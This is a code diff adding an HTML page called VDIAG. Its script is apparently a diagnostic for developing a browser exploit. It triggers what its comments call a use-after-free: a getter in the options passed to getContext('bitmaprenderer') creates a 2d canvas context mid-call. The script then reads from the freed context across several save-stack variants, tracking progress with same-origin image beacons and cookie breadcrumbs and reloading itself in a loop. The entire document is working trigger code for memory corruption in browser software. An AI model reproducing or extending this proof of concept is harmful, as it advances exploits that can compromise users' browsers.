@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>VDIAG</title></head>
+<body><pre id="out">VDIAG — pinpoint crash location</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var _i=[];for(var i=0;i<20;i++)_i.push(new Image());
+var _x=0;
+function bk(t,d){var m=_i[_x++];if(m)m.src='/beacon/VDIAG-'+t+'?d='+encodeURIComponent(String(d).slice(0,400))+'&t='+Date.now();}
+
+bk('B','boot');
+
+/* Test 1: Can we create+destroy a 2d context at all? */
+var c1=document.createElement('canvas');c1.width=1;c1.height=1;
+var x1=c1.getContext('2d');
+x1.lineWidth=5.5;
+bk('T1','ctx='+!!x1+',lw='+x1.lineWidth);
+
+/* Test 2: Can we create bitmaprenderer on a DIFFERENT canvas? */
+var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+var b2=c2.getContext('bitmaprenderer');
+bk('T2','bmr='+!!b2);
+
+/* Test 3: UAF trigger with NO saves (inline stateStack).
+   Cookie breadcrumb before each step. */
+try{document.cookie='vd=pre-uaf;max-age=60';}catch(e){}
+
+var c3=document.createElement('canvas');c3.width=1;c3.height=1;
+var ic3=null;
+var d3={};
+Object.defineProperty(d3,'alpha',{get:function(){
+  ic3=c3.getContext('2d');
+  ic3.lineWidth=42.42;
+  return true;
+}});
+
+bk('T3a','pre-trigger');
+try{document.cookie='vd=triggering;max-age=60';}catch(e){}
+c3.getContext('bitmaprenderer',d3);
+try{document.cookie='vd=post-trigger;max-age=60';}catch(e){}
+bk('T3b','post-trigger,ic3='+!!ic3);
+
+/* Test 4: Read lineWidth from freed context (ZERO allocs since trigger) */
+var lw3=-999;
+try{lw3=ic3.lineWidth;}catch(e){lw3='E:'+e.name;}
+try{document.cookie='vd=post-read;max-age=60';}catch(e){}
+bk('T3c','lw='+lw3);
+
+/* Test 5: null the wrapper, then beacon */
+ic3=null;c3=null;d3=null;
+bk('T3d','nulled');
+
+/* Test 6: Same thing WITH 2 saves */
+var c4=document.createElement('canvas');c4.width=1;c4.height=1;
+var ic4=null;
+var d4={};
+Object.defineProperty(d4,'alpha',{get:function(){
+  ic4=c4.getContext('2d');
+  ic4.save();ic4.save();
+  ic4.lineWidth=33.33;
+  return true;
+}});
+bk('T4a','pre-2save');
+c4.getContext('bitmaprenderer',d4);
+var lw4=-999;
+try{lw4=ic4.lineWidth;}catch(e){lw4='E:'+e.name;}
+ic4=null;c4=null;d4=null;
+bk('T4b','lw='+lw4);
+
+/* Test 7: Same thing WITH 8 saves */
+var c5=document.createElement('canvas');c5.width=1;c5.height=1;
+var ic5=null;
+var d5={};
+Object.defineProperty(d5,'alpha',{get:function(){
+  ic5=c5.getContext('2d');
+  for(var s=0;s<8;s++)ic5.save();
+  ic5.lineWidth=11.11;
+  return true;
+}});
+bk('T5a','pre-8save');
+c5.getContext('bitmaprenderer',d5);
+var lw5=-999;
+try{lw5=ic5.lineWidth;}catch(e){lw5='E:'+e.name;}
+ic5=null;c5=null;d5=null;
+bk('T5b','lw='+lw5);
+
+bk('D','done');
+O.textContent='VDIAG DONE';
+try{document.cookie='vd=done;max-age=120';}catch(e){}
+setTimeout(function(){location.reload();},20000);
+</script>
+</body></html>
